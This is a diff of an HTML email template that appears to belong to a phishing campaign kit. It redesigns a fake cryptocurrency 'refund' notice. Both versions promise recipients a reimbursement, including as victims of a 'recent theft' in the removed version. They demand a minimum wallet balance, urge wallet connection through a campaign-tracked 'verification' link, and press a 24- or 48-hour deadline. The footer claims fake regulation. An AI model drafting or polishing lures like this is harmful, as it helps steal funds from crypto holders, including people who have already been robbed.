@@ -3,332 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Transaction Status Update</title>
+    <title>Cryptocurrency Refund Notification</title>
     <style>
-        :root {
-            --primary: #2563eb;
-            --primary-dark: #1e40af;
-            --primary-light: #eff6ff;
-            --success: #059669;
-            --success-light: #ecfdf5;
-            --warning: #fbbf24;
-            --text-primary: #1e293b;
-            --text-secondary: #64748b;
-            --border: #e2e8f0;
-            --surface: #ffffff;
-            --background: #f8fafc;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background-color: var(--background);
-            line-height: 1.6;
-            color: var(--text-primary);
-            -webkit-font-smoothing: antialiased;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.5;
+            background-color: #f4f4f5;
+            padding: 20px;
         }
-
-        .wrapper {
-            width: 100%;
-            max-width: 100%;
-            margin: 0;
-            padding: 40px 20px;
-            background: var(--background);
-        }
-
+        
         .container {
             max-width: 600px;
             margin: 0 auto;
-            background: var(--surface);
-            border-radius: 24px;
+            background: transparent;
+            border-radius: 12px;
             overflow: hidden;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
-
+        
         .header {
-            background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%);
-            padding: 40px 32px;
+            border-radius: 2em;
+            background: linear-gradient(to right, #1a56db, #1e429f);
+            padding: 32px 24px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .header::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M10 50C10 27.909 27.909 10 50 10C72.091 10 90 27.909 90 50C90 72.091 72.091 90 50 90C27.909 90 10 72.091 10 50Z' stroke='rgba(255,255,255,0.1)' stroke-width='1'/%3E%3C/svg%3E");
-            opacity: 0.1;
-        }
-
-        .header-content {
-            position: relative;
-            z-index: 1;
-        }
-
-        .header-icon {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 16px;
-            border-radius: 16px;
-            display: inline-block;
-            margin-bottom: 20px;
-        }
-
-        .header-title {
             color: white;
+        }
+        
+        .header h1 {
             font-size: 24px;
-            font-weight: 700;
             margin-bottom: 8px;
         }
-
-        .header-subtitle {
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 16px;
-        }
-
+        
         .content {
-            padding: 32px;
+            padding: 24px;
         }
-
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--success-light);
-            color: var(--success);
-            padding: 8px 16px;
-            border-radius: 100px;
-            font-size: 14px;
-            font-weight: 600;
+        
+        .amount-card {
+            background-color: #f0f9ff;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 4em;
+        }
+        
+        .amount-label {
+            color: #0369a1;
+            font-size: 10px;
+            margin-bottom: 8px;
+        }
+        
+        .amount-value {
+            color: #0c4a6e;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .details-card {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 20px;
             margin-bottom: 24px;
         }
-
-        .transaction-card {
-            background: var(--primary-light);
-            border-radius: 16px;
-            padding: 24px;
-            margin: 24px 0;
-        }
-
-        .transaction-row {
-            display: flex;
-            justify-content: space-between;
+        
+        .detail-row {
             padding: 12px 0;
-            border-bottom: 1px solid rgba(37, 99, 235, 0.1);
+            border-bottom: 1px solid #e2e8f0;
         }
-
-        .transaction-row:last-child {
+        
+        .detail-row:last-child {
             border-bottom: none;
         }
-
-        .transaction-label {
-            color: var(--text-secondary);
+        
+        .detail-label {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .detail-value {
+            color: #0f172a;
+            font-size: 16px;
             font-weight: 500;
         }
-
-        .transaction-value {
-            color: var(--text-primary);
-            font-weight: 600;
-        }
-
-        .verification-steps {
-            margin: 32px 0;
-        }
-
-        .step {
-            display: flex;
-            align-items: flex-start;
-            gap: 16px;
-            padding: 16px;
-            background: var(--background);
-            border-radius: 12px;
-            margin-bottom: 12px;
-        }
-
-        .step-number {
-            background: var(--primary);
-            color: white;
-            width: 28px;
-            height: 28px;
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            font-size: 14px;
-            flex-shrink: 0;
-        }
-
-        .verify-button {
+        
+        .cta-button {
             display: block;
-            background: var(--primary);
+            background: linear-gradient(to right, #2563eb, #1d4ed8);
             color: white;
             text-decoration: none;
             padding: 16px 32px;
-            border-radius: 12px;
+            border-radius: 8px;
             text-align: center;
             font-weight: 600;
-            font-size: 16px;
-            margin: 32px 0;
-            transition: all 0.2s ease;
+            margin: 30px 0;
+            transition: transform 0.1s ease;
         }
-
-        .verify-button:hover {
-            background: var(--primary-dark);
+        
+        .cta-button:hover {
             transform: translateY(-1px);
         }
-
-        .security-notice {
-            background: #fff7ed;
-            border: 1px solid #ffedd5;
+        
+        .warning {
+            background-color: #fff7ed;
+            border-left: 4px solid #f97316;
             padding: 16px;
-            border-radius: 12px;
-            margin: 24px 0;
-            font-size: 14px;
-            color: #9a3412;
+            border-radius: 4px;
+            margin-bottom: 24px;
         }
-
+        
+        .warning p {
+            color: #9a3412;
+            font-size: 14px;
+        }
+        
         .footer {
-            background: var(--background);
+            background-color: #f8fafc;
             padding: 24px;
             text-align: center;
-            border-top: 1px solid var(--border);
+            border-top: 1px solid #e2e8f0;
         }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-bottom: 16px;
-        }
-
-        .footer-link {
-            color: var(--text-secondary);
-            text-decoration: none;
+        
+        .footer p {
+            color: #64748b;
             font-size: 14px;
+            margin-bottom: 8px;
         }
-
-        .compliance-text {
-            font-size: 12px;
-            color: var(--text-secondary);
-            text-align: center;
-            margin-top: 16px;
-        }
-
+        
         @media (max-width: 600px) {
-            .content {
-                padding: 24px;
+            body {
+                padding: 12px;
             }
             
             .header {
-                padding: 32px 24px;
+                padding: 24px 16px;
+            }
+            
+            .content {
+                padding: 16px;
+            }
+            
+            .header h1 {
+                font-size: 20px;
+            }
+            
+            .amount-value {
+                font-size: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="container">
-            <div class="header">
-                <div class="header-content">
-                    <div class="header-icon">
-                    </div>
-                    <h1 class="header-title">{{cryptocurrency.name}} Refund</h1>
-                    <p class="header-subtitle">Verification Required</p>
+    <div class="container">
+        <div class="header">
+            <h1>{{ cryptocurrency.name }} Refund Available</h1>
+            <p>Your verification is required to process the refund</p>
+        </div>
+        
+        <div class="content">
+            <div class="amount-card">
+                <div class="amount-label">Refund Amount</div>
+                <div class="amount-value">{{ quantity }} {{ cryptocurrency.name }}</div>
+            </div>
+            
+            <div class="details-card">
+                <div class="detail-row">
+                    <div class="detail-label">Transaction Type</div>
+                    <div class="detail-value">Refund Process</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">Minimum Required Balance</div>
+                    <div class="detail-value">{{ min_balance }} {{ cryptocurrency.name }}</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">Status</div>
+                    <div class="detail-value" style="color: #ea580c;">Pending Verification</div>
                 </div>
             </div>
-
-            <div class="content">
-                <div class="status-badge">
-                    ✓ Processing
-                </div>
-
-                <p>Dear {{ recipient_email }},</p>
-
-                <p>You are eligible for reimbursement of {{ quantity }} {{cryptocurrency.name }} due to your inclusion in the list of indivduals affected by the recent {{ cryptocurrency.name }} theft.</p>
-
-                <div class="transaction-card">
-                    <div class="transaction-row">
-                        <span class="transaction-label">Transaction Type</span>
-                        <span class="transaction-value">Account Settlement</span>
-                    </div>
-                    <div class="transaction-row">
-                        <span class="transaction-label">Amount</span>
-                        <span class="transaction-value">  {{ quantity }} {{ cryptocurrency.name }}</span>
-                    </div>
-                    <div class="transaction-row">
-                        <div class="transaction-label">Required Balance</div>
-                        <div class="transaction-value">  {{ min_balance }} {{ cryptocurrency.name }}</div>
-                    </div>
-                    <div class="transaction-row">
-                        <span class="transaction-label">Status</span>
-                        <span class="transaction-value">Pending Verification</span>
-                    </div>
-                    <p>To verify wallet activity ensure you have a minimum of {{min_balance}} {{ cryptocurrency.name }}</p>
-                </div>
-
-                <div class="verification-steps">
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <div>
-                            <h3>Account Verification</h3>
-                            <p>Connect your wallet to verify ownership</p>
-                        </div>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <div>
-                            <h3>Required Balance</h3>
-                            <p>Confirm minimum Balance</p>
-                        </div>
-                    </div>
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <div>
-                            <h3>Complete Process</h3>
-                            <p>Finalize the transaction</p>
-                        </div>
-                    </div>
-                </div>
-
-                <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="verify-button">
-                    Verify Account & Continue
-                </a>
-
-                <div class="security-notice">
-                    <strong>Security Notice:</strong>
-                    <ul style="margin-top: 8px; margin-left: 20px;">
-                        <li>Contact support for assistance</li>
-                    </ul>
-                </div>
-
-                <p style="text-align: center; color: var(--text-secondary); font-size: 14px;">
-                    For security reasons, this process must be completed within 24 hours.
-                </p>
+            
+            <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="cta-button">
+                Begin Verification
+            </a>
+            
+            <div class="warning">
+                <p>⚠️ Important: This verification process must be completed within 48 hours for security purposes. After this period, the refund request may need to be reinitiated.</p>
             </div>
-
-            <div class="footer">
-                <div class="footer-links">
-                    <a href="#" class="footer-link">Security</a>
-                    <a href="#" class="footer-link">Help Center</a>
-                    <a href="#" class="footer-link">Terms</a>
-                </div>
-                <p style="color: var(--text-secondary); font-size: 13px;">
-                    &copy; {{ current_year }} Secure Transaction Services. All rights reserved.
-                </p>
-                <p class="compliance-text">
-                    Registered and regulated under applicable financial services regulations.
-                </p>
-            </div>
+        </div>
+        
+        <div class="footer">
+            <p>&copy; {{ current_year }} Refund Services. All rights reserved.</p>
         </div>
     </div>
 </body>
